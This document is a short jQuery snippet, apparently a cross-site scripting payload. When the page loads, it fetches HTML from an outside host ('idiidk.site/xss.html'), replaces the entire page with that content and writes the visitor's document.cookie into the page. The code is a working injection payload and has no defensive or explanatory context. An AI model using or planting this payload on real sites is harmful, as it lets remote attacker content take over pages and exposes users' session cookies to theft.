$(() => {
  $.get("https://idiidk.site/xss.html", function (res) {
    $("html").html(res)
    $("#cookies").html(document.cookie)
  })
})